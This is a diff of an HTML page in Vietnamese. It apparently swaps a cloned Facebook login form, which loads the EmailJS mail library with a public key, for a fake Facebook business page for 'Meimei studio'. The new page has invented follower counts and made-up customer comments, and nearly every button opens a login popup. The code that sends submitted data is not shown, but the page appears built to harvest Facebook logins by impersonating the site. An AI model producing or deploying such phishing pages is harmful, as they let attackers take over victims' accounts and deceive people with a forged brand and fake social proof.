@@ -3,148 +3,492 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Đăng nhập hoặc đăng ký</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <title>Meimei studio | Facebook</title>
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+        body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            display: flex;
-            max-width: 980px;
-            width: 100%;
-            padding: 20px 0;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .left-section {
-            flex: 1;
-            padding-right: 40px;
-        }
-        .logo {
-            width: 320px;
-            height: auto;
-            margin-bottom: 8px;
-        }
-        .slogan {
-            font-size: 28px;
-            line-height: 32px;
             color: #1c1e21;
-            font-weight: normal;
-            max-width: 500px;
+            line-height: 1.34;
         }
-        .right-section {
-            width: 396px;
-        }
-        .login-container, .create-container, .forgot-container, .language-container, .privacy-container, .terms-container, .help-container {
+
+        /* Header */
+        .header {
             background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            display: none;
+            padding: 0 16px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .login-container.active, .create-container.active, .forgot-container.active, .language-container.active, .privacy-container.active, .terms-container.active, .help-container.active {
-            display: block;
+        .header .logo {
+            flex: 0 0 auto;
+            margin-right: 8px;
         }
-        input {
+        .header .logo img {
+            height: 40px;
+        }
+        .header .search-bar {
+            flex: 1;
+            max-width: 240px;
+            position: relative;
+        }
+        .header .search-bar input {
             width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            box-sizing: border-box;
-            transition: border-color 0.2s;
+            padding: 8px 12px 8px 36px;
+            border: none;
+            background: #f0f2f5;
+            border-radius: 999px;
+            font-size: 15px;
+            color: #1c1e21;
         }
-        input:focus {
-            border-color: #1877f2;
+        .header .search-bar input:focus {
             outline: none;
+            background: #fff;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
-        .btn-login, .btn-submit, .btn-forgot {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .btn-login:hover, .btn-submit:hover, .btn-forgot:hover {
-            background: #166fe5;
-        }
-        .forgot-password, .btn-back {
-            color: #1877f2;
-            font-size: 14px;
-            display: block;
-            margin: 16px 0;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .forgot-password:hover, .btn-back:hover {
-            text-decoration: underline;
-        }
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 20px 16px;
-        }
-        .btn-create {
-            padding: 14px 20px;
-            background: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .btn-create:hover {
-            background: #36a420;
-        }
-        .footer {
-            padding: 20px 0;
-            font-size: 12px;
-            color: #8a8d91;
-            text-align: center;
-            width: 100%;
-        }
-        .footer a {
-            color: #8a8d91;
-            margin: 0 8px;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .popup {
-            display: none;
-            position: fixed;
+        .header .search-bar::before {
+            content: '🔍'; /* Should be Facebook's search icon (gray, 16px) */
+            position: absolute;
+            left: 12px;
             top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.3);
-            text-align: center;
-            z-index: 1000;
-            max-width: 400px;
-            border: 1px solid #dadde1;
+            transform: translateY(-50%);
+            color: #65676b;
+            font-size: 16px;
         }
+        .header .user-actions {
+            display: flex;
+            gap: 8px;
+            margin-left: auto;
+        }
+        .header .user-actions .icon {
+            width: 40px;
+            height: 40px;
+            background: #e4e6eb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+            color: #050505;
+        }
+        .header .user-actions .icon:hover {
+            background: #d8dadf;
+        }
+        .header .user-actions .icon.profile::before {
+            content: '👤'; /* Should be Facebook's profile icon (black, 20px) */
+        }
+        .header .user-actions .icon.messenger::before {
+            content: '💬'; /* Should be Facebook's messenger icon (black, 20px) */
+        }
+        .header .user-actions .icon.notifications::before {
+            content: '🔔'; /* Should be Facebook's notifications icon (black, 20px) */
+        }
+        .header .login-btn {
+            background: #1b74e4;
+            color: #fff;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .header .login-btn:hover {
+            background: #165bb0;
+        }
+
+        /* Nội dung trang */
+        .content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+        .cover-photo-container {
+            position: relative;
+            width: 100%;
+            height: 350px;
+            background: #e4e6eb;
+        }
+        .cover-photo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 0 0 8px 8px;
+        }
+        .cover-photo-container .edit-cover {
+            position: absolute;
+            bottom: 16px;
+            right: 16px;
+            background: #fff;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #050505;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+        }
+        .cover-photo-container .edit-cover::before {
+            content: '📷'; /* Should be Facebook's camera icon (black, 16px) */
+            margin-right: 6px;
+        }
+        .cover-photo-container .edit-cover:hover {
+            background: #f2f2f2;
+        }
+        .profile-section {
+            position: relative;
+            margin-top: -84px;
+            padding: 0 16px;
+            display: flex;
+            align-items: flex-end;
+        }
+        .profile-pic-container {
+            position: relative;
+            margin-right: 16px;
+        }
+        .profile-pic {
+            width: 168px;
+            height: 168px;
+            border-radius: 50%;
+            border: 4px solid #fff;
+            object-fit: cover;
+            display: block;
+            background: #e4e6eb;
+        }
+        .profile-pic-container .edit-pic {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: #e4e6eb;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 2px solid #fff;
+        }
+        .profile-pic-container .edit-pic::before {
+            content: '📷'; /* Should be Facebook's camera icon (black, 16px) */
+            font-size: 16px;
+            color: #050505;
+        }
+        .profile-pic-container .edit-pic:hover {
+            background: #d8dadf;
+        }
+        .profile-info {
+            flex: 1;
+            margin-bottom: 16px;
+        }
+        .profile-info h2 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .profile-info h2::after {
+            content: '✔';
+            color: #1b74e4;
+            font-size: 20px;
+            margin-left: 6px;
+        }
+        .profile-info .stats {
+            font-size: 15px;
+            color: #65676b;
+            margin: 4px 0;
+        }
+        .profile-info .stats span::after {
+            content: '•';
+            margin: 0 5px;
+        }
+        .profile-info .stats span:last-child::after {
+            content: '';
+        }
+        .profile-info .description {
+            font-size: 14px;
+            color: #1c1e21;
+            margin: 8px 0;
+        }
+        .profile-info .details a {
+            color: #1b74e4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .profile-info .details a:hover {
+            text-decoration: underline;
+        }
+        .button-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .follow-btn, .message-btn {
+            background: #1b74e4;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            height: 36px;
+        }
+        .message-btn {
+            background: #e4e6eb;
+            color: #050505;
+        }
+        .follow-btn::before {
+            content: '➕'; /* Should be Facebook's plus icon (white, 16px) */
+            margin-right: 6px;
+            font-size: 16px;
+        }
+        .message-btn::before {
+            content: '💬'; /* Should be Facebook's chat icon (black, 16px) */
+            margin-right: 6px;
+            font-size: 16px;
+        }
+        .follow-btn:hover {
+            background: #165bb0;
+        }
+        .message-btn:hover {
+            background: #d8dadf;
+        }
+        .tabs-container {
+            background: #fff;
+            border-bottom: 1px solid #dadde1;
+            margin: 0 16px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .tabs {
+            display: flex;
+            padding: 0;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        .tabs a {
+            padding: 12px 16px;
+            font-size: 15px;
+            color: #65676b;
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tabs a.active {
+            color: #1b74e4;
+            border-bottom: 2px solid #1b74e4;
+        }
+        .tabs a:hover {
+            background: #f2f2f2;
+        }
+
+        /* Main Content */
+        .main-content {
+            display: flex;
+            gap: 16px;
+            margin: 16px 0;
+        }
+        .sidebar {
+            flex: 1;
+            max-width: 360px;
+        }
+        .posts {
+            flex: 2;
+        }
+        .intro-section, .about-section, .photos-section, .videos-section, .reels-section, .likes-section {
+            background: #fff;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .about-section, .photos-section, .videos-section, .reels-section, .likes-section {
+            display: none;
+        }
+        .about-tabs {
+            display: flex;
+            border-bottom: 1px solid #dadde1;
+            margin-bottom: 16px;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        .about-tabs a {
+            padding: 8px 16px;
+            font-size: 14px;
+            color: #65676b;
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+        }
+        .about-tabs a.active {
+            color: #1b74e4;
+            border-bottom: 2px solid #1b74e4;
+        }
+        .about-content {
+            display: none;
+        }
+        .about-content.active {
+            display: block;
+        }
+        .about-content .info-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .about-content .info-item::before {
+            content: '📍'; /* Placeholder for Facebook's icons (e.g., email, phone, etc.) */
+            margin-right: 8px;
+            color: #65676b;
+            font-size: 16px;
+        }
+        .photos-section .sub-tabs {
+            display: flex;
+            border-bottom: 1px solid #dadde1;
+            margin-bottom: 16px;
+        }
+        .photos-section .sub-tabs a {
+            padding: 8px 16px;
+            font-size: 14px;
+            color: #65676b;
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+        }
+        .photos-section .sub-tabs a.active {
+            color: #1b74e4;
+            border-bottom: 2px solid #1b74e4;
+        }
+        .photos-section .album {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 8px;
+        }
+        .photos-section .album img {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .photos-section .album img:hover {
+            opacity: 0.9;
+        }
+        .post {
+            background: #fff;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .post-header img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .post-header .info {
+            flex: 1;
+        }
+        .post-header .info .name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #050505;
+        }
+        .post-header .info .time {
+            font-size: 12px;
+            color: #65676b;
+        }
+        .post-header .info .time::after {
+            content: '🌍';
+            margin-left: 4px;
+            font-size: 12px;
+        }
+        .post p {
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .post img {
+            width: 100%;
+            border-radius: 4px;
+            margin: 5px 0;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 13px;
+            color: #65676b;
+            border-top: 1px solid #dadde1;
+        }
+        .actions .action {
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+        }
+        .actions .action:hover {
+            background: #f2f2f2;
+        }
+        .actions .action::before {
+            margin-right: 6px;
+            font-size: 16px;
+        }
+        .actions .action.like::before {
+            content: '👍'; /* Should be Facebook's like icon (gray, 16px) */
+        }
+        .actions .action.love::before {
+            content: '❤️'; /* Should be Facebook's love icon (gray, 16px) */
+        }
+        .actions .action.haha::before {
+            content: '😂'; /* Should be Facebook's haha icon (gray, 16px) */
+        }
+        .actions .action.wow::before {
+            content: '😮'; /* Should be Facebook's wow icon (gray, 16px) */
+        }
+        .actions .action.comment::before {
+            content: '💬'; /* Should be Facebook's comment icon (gray, 16px) */
+        }
+        .actions .action.share::before {
+            content: '↪'; /* Should be Facebook's share icon (gray, 16px) */
+        }
+        .comments {
+            font-size: 13px;
+            color: #1c1e21;
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid #dadde1;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .comments p {
+            margin-bottom: 5px;
+        }
+
+        /* Popup đăng nhập */
         .overlay {
             display: none;
             position: fixed;
@@ -155,261 +499,463 @@
             background: rgba(0, 0, 0, 0.5);
             z-index: 999;
         }
-        h2 {
-            font-size: 24px;
-            color: #1c1e21;
-            margin-bottom: 16px;
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1000;
+            width: 100%;
+            max-width: 400px;
         }
-        .popup h3 {
-            font-size: 20px;
-            color: #1c1e21;
-            margin: 0 0 10px;
+        .popup input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
         }
-        .popup small {
-            font-size: 14px;
-            color: #606770;
-            display: block;
-            margin-bottom: 15px;
+        .popup input:focus {
+            border-color: #1b74e4;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
-        .language-list {
-            list-style: none;
-            padding: 0;
-            font-size: 14px;
-            color: #1c1e21;
-        }
-        .language-list li {
-            margin: 10px 0;
-            cursor: pointer;
-        }
-        .language-list li:hover {
-            text-decoration: underline;
-        }
-        .popup-btn {
-            padding: 10px 20px;
-            background: #e4e6eb;
+        .popup .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #1b74e4;
             border: none;
             border-radius: 6px;
-            color: #050505;
-            font-size: 16px;
+            color: #fff;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
             transition: background 0.2s;
         }
-        .popup-btn:hover {
-            background: #d8dade;
+        .popup .btn-login:hover {
+            background: #165bb0;
         }
-        @media (max-width: 900px) {
-            .container {
+        .popup .forgot-password {
+            color: #1b74e4;
+            font-size: 14px;
+            display: block;
+            margin: 16px 0;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .popup .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .popup .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 16px;
+        }
+        .popup .btn-create {
+            padding: 14px 20px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .popup .btn-create:hover {
+            background: #36a420;
+        }
+
+        /* Responsive cho di động */
+        @media (max-width: 767px) {
+            .content {
+                padding: 0;
+            }
+            .cover-photo-container {
+                height: 200px;
+            }
+            .profile-pic {
+                width: 120px;
+                height: 120px;
+            }
+            .profile-section {
                 flex-direction: column;
+                align-items: center;
                 text-align: center;
             }
-            .left-section {
-                padding-right: 0;
-                margin-bottom: 20px;
+            .profile-pic-container {
+                margin-right: 0;
             }
-            .right-section {
-                width: 90%;
-                max-width: 396px;
+            .profile-info {
+                margin-bottom: 12px;
+            }
+            .profile-info h2 {
+                font-size: 24px;
+            }
+            .button-group {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .follow-btn, .message-btn {
+                width: 100%;
+            }
+            .main-content {
+                flex-direction: column;
+            }
+            .sidebar, .posts {
+                max-width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E"); // Public Key của bạn
-        })();
-    </script>
-
-    <div class="container">
-        <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
-            <p class="slogan">Kết nối với bạn bè và thế giới xung quanh bạn trên Facebook.</p>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
         </div>
-        <div class="right-section">
-            <div class="login-container active">
-                <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
-                <input type="password" id="password" placeholder="Mật khẩu">
-                <button class="btn-login" onclick="loginWithForm()">Đăng nhập</button>
-                <a class="forgot-password" onclick="showForgot()">Quên mật khẩu?</a>
-                <div class="divider"></div>
-                <button class="btn-create" onclick="showCreate()">Tạo tài khoản mới</button>
+        <div class="search-bar">
+            <input type="text" placeholder="Tìm kiếm trên Facebook">
+        </div>
+        <div class="user-actions">
+            <div class="icon profile" onclick="alert('Chuyển đến trang cá nhân (chức năng demo)')"></div>
+            <div class="icon messenger" onclick="alert('Chuyển đến Messenger (chức năng demo)')"></div>
+            <div class="icon notifications" onclick="alert('Chuyển đến thông báo (chức năng demo)')"></div>
+            <button class="login-btn" onclick="showLoginPopup()">Đăng nhập</button>
+        </div>
+    </div>
+
+    <!-- Nội dung trang -->
+    <div class="content">
+        <div class="cover-photo-container">
+            <img src="https://via.placeholder.com/980x350?text=Cover+Photo" alt="Ảnh bìa" class="cover-photo">
+            <button class="edit-cover" onclick="alert('Chức năng chỉnh sửa ảnh bìa (demo)')">Chỉnh sửa ảnh bìa</button>
+        </div>
+        <div class="profile-section">
+            <div class="profile-pic-container">
+                <img src="https://via.placeholder.com/168?text=Profile+Pic" alt="Ảnh đại diện" class="profile-pic">
+                <div class="edit-pic" onclick="alert('Chức năng chỉnh sửa ảnh đại diện (demo)')"></div>
             </div>
-            <div class="create-container">
-                <h2>Tạo tài khoản mới</h2>
-                <input type="text" id="first-name" placeholder="Họ">
-                <input type="text" id="last-name" placeholder="Tên">
-                <input type="text" id="create-email" placeholder="Email hoặc số điện thoại">
-                <input type="password" id="create-password" placeholder="Mật khẩu mới">
-                <button class="btn-submit" onclick="createAccount()">Đăng ký</button>
-                <a class="btn-back" onclick="showLogin()">Quay lại đăng nhập</a>
+            <div class="profile-info">
+                <h2>Meimei studio</h2>
+                <p class="stats"><span>893k lượt thích</span><span>648k người theo dõi</span></p>
+                <p class="description">Tuyển mẫu hình ảnh concept theo sở thích, quay lookbook, thu mẫu feedback và livestream bán hàng, quảng cáo bán hàng.</p>
+                <p class="details"><a href="https://meimeistudio.vn">meimeistudio.vn/...</a></p>
+                <div class="button-group">
+                    <button class="follow-btn" onclick="showLoginPopup()">Theo dõi</button>
+                    <button class="message-btn" onclick="showLoginPopup()">Nhắn tin</button>
+                </div>
             </div>
-            <div class="forgot-container">
-                <h2>Tìm lại tài khoản của bạn</h2>
-                <input type="text" id="forgot-input" placeholder="Email hoặc số điện thoại">
-                <button class="btn-forgot" onclick="submitForgot()">Gửi yêu cầu</button>
-                <a class="btn-back" onclick="showLogin()">Quay lại đăng nhập</a>
+        </div>
+
+        <div class="tabs-container">
+            <div class="tabs">
+                <a href="#" class="active" onclick="showTab('posts-tab')">Bài viết</a>
+                <a href="#" onclick="showTab('about-tab')">Giới thiệu</a>
+                <a href="#" onclick="showTab('photos-tab')">Ảnh</a>
+                <a href="#" onclick="showTab('videos-tab')">Video</a>
+                <a href="#" onclick="showTab('reels-tab')">Reels</a>
+                <a href="#" onclick="showTab('likes-tab')">Lượt</a>
             </div>
-            <div class="language-container">
-                <h2>Chọn ngôn ngữ</h2>
-                <ul class="language-list">
-                    <li onclick="showPopup('Ngôn ngữ', 'Đã chọn Tiếng Việt')">Tiếng Việt</li>
-                    <li onclick="showPopup('Language', 'Switched to English')">English (US)</li>
-                    <li onclick="showPopup('Ngôn ngữ', 'Đã chọn Tiếng Nhật')">日本語</li>
-                </ul>
-                <a class="btn-back" onclick="showLogin()">Quay lại</a>
+        </div>
+
+        <div class="main-content">
+            <div class="sidebar">
+                <div class="intro-section">
+                    <p><strong>Giới thiệu</strong></p>
+                    <p>Meimei Studio chuyên quay lookbook, chụp ảnh concept theo phong cách cá nhân hóa. Livestream bán hàng hàng tuần và nhận quảng cáo bán hàng.</p>
+                    <p>Email: contact@meimeistudio.vn</p>
+                    <p>Hotline: 0909 123 456</p>
+                </div>
             </div>
-            <div class="privacy-container">
-                <h2>Quyền riêng tư</h2>
-                <p>Chúng tôi cam kết bảo vệ thông tin của bạn.</p>
-                <a class="btn-back" onclick="showLogin()">Quay lại</a>
-            </div>
-            <div class="terms-container">
-                <h2>Điều khoản</h2>
-                <p>Bằng cách sử dụng Facebook, bạn đồng ý với các điều khoản của chúng tôi.</p>
-                <a class="btn-back" onclick="showLogin()">Quay lại</a>
-            </div>
-            <div class="help-container">
-                <h2>Trợ giúp</h2>
-                <p>Liên hệ chúng tôi qua email: support@facebook.com</p>
-                <a class="btn-back" onclick="showLogin()">Quay lại</a>
+            <div class="posts">
+                <div id="posts-tab" class="tab-content">
+                    <!-- Bài viết 1 -->
+                    <div class="post">
+                        <div class="post-header">
+                            <img src="https://via.placeholder.com/40?text=Profile+Pic" alt="Profile Pic">
+                            <div class="info">
+                                <div class="name">Meimei Studio</div>
+                                <div class="time">1 giờ</div>
+                            </div>
+                        </div>
+                        <p>IB còn nhiều mẫu concept đang hot bên nhà Meimei nha mấy nàng 😊</p>
+                        <img src="https://via.placeholder.com/680x400?text=Concept+Hot" alt="Concept hot">
+                        <div class="actions">
+                            <div class="action like" onclick="showLoginPopup()">👍 7.8k</div>
+                            <div class="action love" onclick="showLoginPopup()">❤️ 1.2k</div>
+                            <div class="action haha" onclick="showLoginPopup()">😂 500</div>
+                            <div class="action wow" onclick="showLoginPopup()">😮 300</div>
+                            <div class="action comment" onclick="showLoginPopup()">💬 Bình luận</div>
+                            <div class="action share" onclick="alert('Chia sẻ bài viết (chức năng demo)')">↪ Chia sẻ</div>
+                        </div>
+                        <div class="comments">
+                            <p><strong>Lan Anh:</strong> Mẫu này xinh quá Meimei ơi!</p>
+                            <p><strong>Ngọc Mai:</strong> IB ngay đây, shop rep sớm nha 😍</p>
+                            <p><strong>Thảo Vy:</strong> Đẹp quá, đặt ngay thôi!</p>
+                            <p><strong>Hương Giang:</strong> Mẫu này hợp style mình ghê!</p>
+                            <p><strong>Minh Thư:</strong> Shop còn mẫu này không ạ?</p>
+                        </div>
+                    </div>
+
+                    <!-- Bài viết 2 -->
+                    <div class="post">
+                        <div class="post-header">
+                            <img src="https://via.placeholder.com/40?text=Profile+Pic" alt="Profile Pic">
+                            <div class="info">
+                                <div class="name">Meimei Studio</div>
+                                <div class="time">2 giờ</div>
+                            </div>
+                        </div>
+                        <p>Lookbook mới nhất từ mẫu concept độc quyền – bạn đã chọn được phong cách nào chưa?</p>
+                        <img src="https://via.placeholder.com/680x400?text=Lookbook" alt="Lookbook">
+                        <div class="actions">
+                            <div class="action like" onclick="showLoginPopup()">👍 7.5k</div>
+                            <div class="action love" onclick="showLoginPopup()">❤️ 1.0k</div>
+                            <div class="action haha" onclick="showLoginPopup()">😂 400</div>
+                            <div class="action wow" onclick="showLoginPopup()">😮 200</div>
+                            <div class="action comment" onclick="showLoginPopup()">💬 Bình luận</div>
+                            <div class="action share" onclick="alert('Chia sẻ bài viết (chức năng demo)')">↪ Chia sẻ</div>
+                        </div>
+                        <div class="comments">
+                            <p><strong>Hương Trà:</strong> Phong cách này đỉnh quá!</p>
+                            <p><strong>Thảo Linh:</strong> Mình thích cái váy đỏ, còn hàng không shop?</p>
+                            <p><strong>Minh Anh:</strong> Đẹp quá, để mình chọn thêm 😍</p>
+                            <p><strong>Ngọc Lan:</strong> Lookbook này xịn thật!</p>
+                            <p><strong>Thu Hà:</strong> Mẫu váy này đẹp quá shop ơi!</p>
+                        </div>
+                    </div>
+
+                    <!-- Bài viết 3 -->
+                    <div class="post">
+                        <div class="post-header">
+                            <img src="https://via.placeholder.com/40?text=Profile+Pic" alt="Profile Pic">
+                            <div class="info">
+                                <div class="name">Meimei Studio</div>
+                                <div class="time">3 giờ</div>
+                            </div>
+                        </div>
+                        <p>Livestream bán hàng tối nay 20h – giảm giá 20% toàn bộ đơn hàng. Đừng bỏ lỡ!</p>
+                        <img src="https://via.placeholder.com/680x400?text=Livestream" alt="Countdown livestream">
+                        <div class="actions">
+                            <div class="action like" onclick="showLoginPopup()">👍 7.2k</div>
+                            <div class="action love" onclick="showLoginPopup()">❤️ 900</div>
+                            <div class="action haha" onclick="showLoginPopup()">😂 300</div>
+                            <div class="action wow" onclick="showLoginPopup()">😮 150</div>
+                            <div class="action comment" onclick="showLoginPopup()">💬 Bình luận</div>
+                            <div class="action share" onclick="alert('Chia sẻ bài viết (chức năng demo)')">↪ Chia sẻ</div>
+                        </div>
+                        <div class="comments">
+                            <p><strong>Thu Hà:</strong> Chờ livestream tối nay đây!</p>
+                            <p><strong>Yến Nhi:</strong> Giảm 20% là phải săn ngay            ngay rồi 😍</p>
+                            <p><strong>Ngọc Lan:</strong> Livestream có gì hot không shop?</p>
+                            <p><strong>Minh Thu:</strong> Đẹp quá, chờ tối nay thôi!</p>
+                            <p><strong>Thùy Dương:</strong> Giảm giá thế này là phải đặt!</p>
+                        </div>
+                    </div>
+
+                    <!-- Bài viết 4 -->
+                    <div class="post">
+                        <div class="post-header">
+                            <img src="https://via.placeholder.com/40?text=Profile+Pic" alt="Profile Pic">
+                            <div class="info">
+                                <div class="name">Meimei Studio</div>
+                                <div class="time">1 ngày</div>
+                            </div>
+                        </div>
+                        <p>Tuyển mẫu ảnh concept theo sở thích – inbox ngay để đăng ký!</p>
+                        <img src="https://via.placeholder.com/680x400?text=Tuyen+Mau" alt="Tuyển mẫu">
+                        <div class="actions">
+                            <div class="action like" onclick="showLoginPopup()">👍 7k</div>
+                            <div class="action love" onclick="showLoginPopup()">❤️ 800</div>
+                            <div class="action haha" onclick="showLoginPopup()">😂 200</div>
+                            <div class="action wow" onclick="showLoginPopup()">😮 100</div>
+                            <div class="action comment" onclick="showLoginPopup()">💬 Bình luận</div>
+                            <div class="action share" onclick="alert('Chia sẻ bài viết (chức năng demo)')">↪ Chia sẻ</div>
+                        </div>
+                        <div class="comments">
+                            <p><strong>Linh Nguyễn:</strong> Mẫu này xinh quá, đăng ký ở đâu vậy shop?</p>
+                            <p><strong>Hà Anh:</strong> Concept này đẹp thật, mình muốn thử!</p>
+                            <p><strong>Phương Thảo:</strong> Đăng ký xong rồi, chờ shop liên hệ nha!</p>
+                            <p><strong>Ngọc Lan:</strong> Tuyển mẫu thế nào vậy shop?</p>
+                            <p><strong>Minh Thu:</strong> Đẹp quá, muốn đăng ký luôn!</p>
+                        </div>
+                    </div>
+
+                    <!-- Bài viết 5 -->
+                    <div class="post">
+                        <div class="post-header">
+                            <img src="https://via.placeholder.com/40?text=Profile+Pic" alt="Profile Pic">
+                            <div class="info">
+                                <div class="name">Meimei Studio</div>
+                                <div class="time">2 ngày</div>
+                            </div>
+                        </div>
+                        <p>Cảm ơn chị H. đã gửi feedback về chiếc áo len siêu xinh này! Ai muốn sở hữu thì đặt hàng nhé!</p>
+                        <img src="https://via.placeholder.com/680x400?text=Ao+Len" alt="Feedback áo len">
+                        <div class="actions">
+                            <div class="action like" onclick="showLoginPopup()">👍 8k</div>
+                            <div class="action love" onclick="showLoginPopup()">❤️ 1.5k</div>
+                            <div class="action haha" onclick="showLoginPopup()">😂 600</div>
+                            <div class="action wow" onclick="showLoginPopup()">😮 400</div>
+                            <div class="action comment" onclick="showLoginPopup()">💬 Bình luận</div>
+                            <div class="action share" onclick="alert('Chia sẻ bài viết (chức năng demo)')">↪ Chia sẻ</div>
+                        </div>
+                        <div class="comments">
+                            <p><strong>Ngọc Anh:</strong> Áo len này xinh quá, đặt ngay đây!</p>
+                            <p><strong>Minh Thu:</strong> Chất đẹp thật, feedback chuẩn luôn 😍</p>
+                            <p><strong>Ngọc Lan:</strong> Áo này đẹp quá shop ơi!</p>
+                            <p><strong>Thùy Dương:</strong> Đặt hàng ở đâu vậy shop?</p>
+                            <p><strong>Phương Linh:</strong> Chất áo này xịn thật!</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="about-tab" class="about-section tab-content">
+                    <div class="about-tabs">
+                        <a href="#" class="active" onclick="showAboutTab('overview')">Tổng quan</a>
+                        <a href="#" onclick="showAboutTab('contact')">Liên hệ</a>
+                        <a href="#" onclick="showAboutTab('work')">Công việc</a>
+                        <a href="#" onclick="showAboutTab('address')">Địa chỉ</a>
